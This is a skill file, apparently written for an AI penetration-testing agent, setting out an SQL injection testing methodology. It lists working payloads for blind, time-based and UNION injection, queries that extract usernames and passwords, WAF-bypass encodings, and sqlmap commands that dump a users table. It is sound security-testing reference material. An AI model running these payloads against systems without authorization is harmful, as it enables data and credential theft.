---
name: sql-injection-testing
description: Specialized techniques and methodology for SQL injection testing
version: 1.0.0
---

# SQL Injection Testing

## Overview

SQL injection is a common and dangerous web application vulnerability. This skill provides a systematic approach to SQL injection testing, detection techniques, and exploitation strategies.

## Testing Methodology

### 1. Parameter Identification
- Identify all user input points: URL parameters, POST data, HTTP headers, cookies, etc.
- Focus on parameters such as `id`, `search`, `filter`, and `sort`
- Use Burp Suite or a similar tool to intercept and modify requests

### 2. Basic Detection
- Single quote test: `'` - check whether a SQL error appears
- Boolean-based blind: `' AND '1'='1` vs `' AND '1'='2`
- Time-based blind: `' AND SLEEP(5)--`
- UNION query: `' UNION SELECT NULL--`

### 3. Database Fingerprinting
- MySQL: `' AND @@version LIKE '%mysql%'--`
- PostgreSQL: `' AND version() LIKE '%PostgreSQL%'--`
- MSSQL: `' AND @@version LIKE '%Microsoft%'--`
- Oracle: `' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`

### 4. Data Extraction
- Database name: `' UNION SELECT database()--`
- Table names: `' UNION SELECT table_name FROM information_schema.tables--`
- Column names: `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
- Data extraction: `' UNION SELECT username,password FROM users--`

## Tool Usage

### sqlmap
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# Target a specific parameter
sqlmap -u "http://target.com/page" --data="id=1" --method=POST

# Specify the database type
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# List databases
sqlmap -u "http://target.com/page?id=1" --dbs

# List tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump data
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

### Manual Testing
- Use the Burp Suite Repeater module
- Use browser developer tools
- Write Python scripts to automate testing

## Bypass Techniques

### WAF Bypass
- Encoding bypass: URL encoding, Unicode encoding, hex encoding
- Comment bypass: `/**/`, `--`, `#`
- Mixed case: `SeLeCt`, `UnIoN`
- Whitespace substitution: `/**/`, `+`, `%09` (tab), `%0A` (newline)

### Examples
```
Original: ' UNION SELECT NULL--
Bypass 1: '/**/UNION/**/SELECT/**/NULL--
Bypass 2: '%55nion%20select%20null--
Bypass 3: '/*!UNION*//*!SELECT*/null--
```

## Verification and Reporting

### Verification Steps
1. Confirm that SQL statements can be executed
2. Extract database information as proof
3. Assess the impact (data leakage, privilege escalation, etc.)
4. Record the complete PoC (request/response)
5. Submit confirmed findings to the platform via the `report_finding` tool (the sole entry point for recording vulnerabilities on this platform), covering location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting Essentials
- Vulnerability location and affected parameters
- Affected data and systems
- Complete exploitation steps
- Remediation advice (parameterized queries, input validation, etc.)

## Notes

- Test only in authorized environments
- Avoid damaging production data
- Use destructive operations such as DROP and DELETE with care
- Record every testing step for reproducibility
